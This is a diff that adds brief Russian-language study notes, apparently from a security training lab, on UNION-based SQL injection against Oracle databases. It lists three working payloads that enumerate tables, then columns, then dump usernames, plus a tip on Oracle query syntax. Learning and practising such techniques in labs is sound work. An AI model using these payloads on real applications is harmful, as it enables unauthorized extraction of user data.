@@ -1,0 +1,11 @@
+union oracle
+начинаем со схемы, но как в mysql не выйдет
+
+здесь альтернатива:
+'UNION SELECT NULL,table_name FROM all_tables--
+потом
+'UNION SELECT NULL,column_name FROM all_tab_columns WHERE table_name='USERS_UDYFWQ'--
+некст
+' UNION SELECT NULL,USERNAME_TZCDYW FROM+USERS_UDYFWQ--
+
+Главное правило при работе с ораклом, всегда должна быть таблица в конце запроса
